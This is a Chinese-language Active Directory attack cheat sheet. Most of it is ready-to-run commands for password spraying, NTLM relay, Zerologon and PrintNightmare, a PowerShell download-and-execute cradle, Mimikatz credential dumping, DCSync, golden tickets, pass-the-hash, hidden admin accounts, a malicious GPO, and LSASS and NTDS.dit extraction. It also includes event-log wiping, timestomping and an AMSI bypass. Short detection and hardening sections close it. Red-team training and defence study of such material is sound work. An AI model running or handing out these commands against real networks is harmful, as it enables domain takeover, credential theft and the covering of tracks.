# 域环境攻击利用

## 1. 信息收集与侦察

### 1.1 基础信息收集

**powershell**

```
# 获取域信息
net view /domain
nltest /dclist:domainname
Get-ADDomain

# 获取当前用户和权限
whoami /all
net user %username% /domain

# 查询域控信息
nltest /dsgetdc:domainname
Get-ADDomainController
```

### 1.2 高级信息枚举

**powershell**

```
# 使用PowerView进行高级枚举
Import-Module .\PowerView.ps1

# 枚举域用户
Get-DomainUser | Select-Object samaccountname,description,lastlogon

# 枚举域计算机
Get-DomainComputer | Select-Object name,operatingsystem,lastlogon

# 枚举域组和成员
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember

# 枚举信任关系
Get-DomainTrust
```

### 1.3 网络扫描和发现

**bash**

```
# 端口扫描
nmap -sS -sU -p 53,88,135,139,389,445,464,636,3268,3269 192.168.1.0/24

# SMB共享枚举
smbclient -L //192.168.1.100 -N
enum4linux -a 192.168.1.100
```

## 2. 初始访问攻击

### 2.1 凭证攻击技术

**bash**

```
# 密码喷洒攻击
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Company123!' --no-bruteforce

# Kerberos预认证暴力破解
kerbrute userdir --domain company.com --users users.txt --passwords passwords.txt

# AS-REP Roasting攻击
Get-ASREPHash -UserName targetuser -Domain company.com
```

### 2.2 协议级攻击

**bash**

```
# LLMNR/NBNS毒化
responder -I eth0 -wrf

# SMB Relay攻击
ntlmrelayx.py -tf targets.txt -smb2support -c "ipconfig"
```

### 2.3 漏洞利用

**bash**

```
# Zerologon攻击
zerologon_tester.py DC01 192.168.1.10
secretsdump.py -just-dc company.com/DC01\$@192.168.1.10

# PrintNightmare
python3 CVE-2021-1675.py company.com/user:pass@192.168.1.100 '\\192.168.1.50\share\malicious.dll'
```

## 3. 权限提升技术

### 3.1 本地权限提升

**powershell**

```
# 使用PowerUp进行本地提权检查
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/PowerUp.ps1')
Invoke-AllChecks

# 常见提权向量
- 服务权限配置错误
- 未引用的服务路径
- 计划任务权限
- AlwaysInstallElevated
- 令牌权限滥用
```

### 3.2 域内权限提升

**powershell**

```
# Kerberoasting攻击
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash

# AS-REP Roasting
Get-ASREPHash -UserName vulnerableuser -Domain company.com

# ACL滥用攻击
Find-InterestingDomainAcl | Where-Object {$_.IdentityReference -eq "Authenticated Users"}
```

### 3.3 凭据转储技术

**powershell**

```
# 使用Mimikatz转储凭据
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::sam

# DCSync攻击
mimikatz # lsadump::dcsync /domain:company.com /user:administrator
```

## 4. 横向移动技术

### 4.1 Pass The Hash (PTH)

**bash**

```
# 使用多种工具进行PTH
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.100 cmd

# Impacket套件
psexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x whoami
```

### 4.2 Pass The Ticket (PTT)

**powershell**

```
# 黄金票据攻击
mimikatz # kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash_here /ptt

# 白银票据攻击
mimikatz # kerberos::golden /user:ServiceAccount /domain:company.com /sid:S-1-5-21-... /target:Server01.company.com /service:cifs /rc4:server_hash_here /ptt

# 票据注入
mimikatz # kerberos::ptt ticket.kirbi
```

### 4.3 Overpass The Hash

**powershell**

```
# 将NTLM哈希转为Kerberos票据
mimikatz # sekurlsa::pth /user:Administrator /domain:company.com /ntlm:ntlm_hash_here
```

### 4.4 远程执行技术

**bash**

```
# WMI执行
wmiexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# WinRM执行
evil-winrm -i 192.168.1.100 -u Administrator -H ntlm_hash_here

# DCOM执行
Invoke-DCOM -ComputerName 192.168.1.100 -Method MMC20.Application -Command "calc.exe"
```

## 5. 持久化技术

### 5.1 账户持久化

**powershell**

```
# 创建隐藏管理员账户
net user system$ Password123! /add /domain
net group "Domain Admins" system$ /add /domain

# 影子凭证攻击
Whisker.exe add /target:computername$ /domain:company.com /dc:dc01.company.com /path:CN=Configuration,...
```

### 5.2 ACL持久化

**powershell**

```
# 授予DCSync权限
Add-ObjectAcl -TargetDistinguishedName "dc=company,dc=com" -PrincipalIdentity attackeruser -Rights DCSync

# 授予GenericAll权限
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attackeruser -Rights All
```

### 5.3 组策略持久化

**powershell**

```
# 创建恶意GPO
New-GPO -Name "Windows Update"
New-GPLink -Name "Windows Update" -Target "OU=Workstations,DC=company,DC=com"

# 添加启动脚本
Set-GPPrefRegistryValue -Name "Windows Update" -Context Computer -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Update" -Value "C:\malware.exe" -Type String
```

### 5.4 SID History注入

**powershell**

```
# 添加SID History
mimikatz # sid::add /sam:attackeruser /new:administrator_sid
```

## 6. 权限维持与后门

### 6.1 DCShadow攻击

**powershell**

```
# 注册虚假的域控制器
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:cn=user,ou=users,dc=company,dc=com /attribute:userPassword /value:NewPassword123!

# 推送更改
mimikatz # lsadump::dcshadow /push
```

### 6.2 安全描述符后门

**powershell**

```
# 添加后门权限
Add-DomainObjectAcl -TargetDistinguishedName "dc=company,dc=com" -PrincipalIdentity attackeruser -Rights GenericAll
```

### 6.3 金票和银票持久化

**powershell**

```
# 创建长期有效的金票
mimikatz # kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash_here /endin:525600 /renewmax:525600 /ptt
```

## 7. 数据窃取技术

### 7.1 DCSync数据提取

**powershell**

```
# 提取所有域用户哈希
secretsdump.py company.com/attackeruser@dc01.company.com -just-dc

# 使用Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:company.com /all
```

### 7.2 NTDS.dit提取

**bash**

```
# 卷影拷贝提取NTDS.dit
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# 使用secretsdump解析
secretsdump.py -ntds ntds.dit -system system LOCAL
```

### 7.3 LSASS内存转储

**powershell**

```
# 使用内置工具转储LSASS
tasklist | findstr lsass
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full

# 使用Mimikatz分析转储文件
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## 8. 防御规避技术

### 8.1 日志清除

**powershell**

```
# 清除事件日志
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# 清除PowerShell历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# 清除安全日志特定事件
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624 -and $_.Message -like "*attackeruser*"} | Remove-WinEvent
```

### 8.2 时间戳修改

**powershell**

```
# 修改文件时间戳
(Get-Item "C:\malware.exe").CreationTime = (Get-Date).AddDays(-30)
(Get-Item "C:\malware.exe").LastWriteTime = (Get-Date).AddDays(-30)
(Get-Item "C:\malware.exe").LastAccessTime = (Get-Date).AddDays(-30)
```

### 8.3 AMSI绕过

**powershell**

```
# AMSI绕过技术
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## 9. 检测与防御

### 9.1 攻击检测

**powershell**

```
# 监控可疑活动
# - 异常Kerberos票据请求
# - DCSync活动
# - 异常ACL修改
# - 未知的WMI事件订阅
# - 异常的计划任务创建

# PowerShell日志分析
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | 
    Where-Object {$_.Message -like "*Invoke-Mimikatz*"}
```

### 9.2 防御加固

**powershell**

```
# 保护特权账户
- 限制域管理员登录范围
- 实施Just Enough Administration (JEA)
- 启用Protected Users安全组
- 实施LAPS（本地管理员密码解决方案）

# 强化域控制器
- 启用Credential Guard
- 实施LSA保护
- 限制DCSync权限
- 启用Windows Defender攻击面减少规则
```

### 9.3 监控配置

**powershell**

```
# 启用详细审计
Auditpol /set /category:"Account Management" /success:enable /failure:enable
Auditpol /set /category:"DS Access" /success:enable /failure:enable
Auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable

# 配置SACL监控
- 监控敏感组（Domain Admins, Enterprise Admins）的成员变更
- 监控域根对象的ACL变更
- 监控GPO的创建和修改
```

## 10. 工具与资源

### 10.1 常用工具列表

* **信息收集** : PowerView, ADModule, BloodHound
* **攻击利用** : Mimikatz, Impacket, CrackMapExec
* **横向移动** : PsExec, WMI, PowerShell Remoting
* **持久化** : DCSync, Golden Tickets, ACL滥用
* **C2框架** : Cobalt Strike, Metasploit, Empire

### 10.2 缓解策略

1. **最小权限原则** ：限制域管理员权限
2. **网络分段** ：隔离域控制器和敏感系统
3. **监控告警** ：实时检测攻击活动
4. **补丁管理** ：及时修复系统漏洞
5. **安全意识** ：培训员工识别社会工程攻击
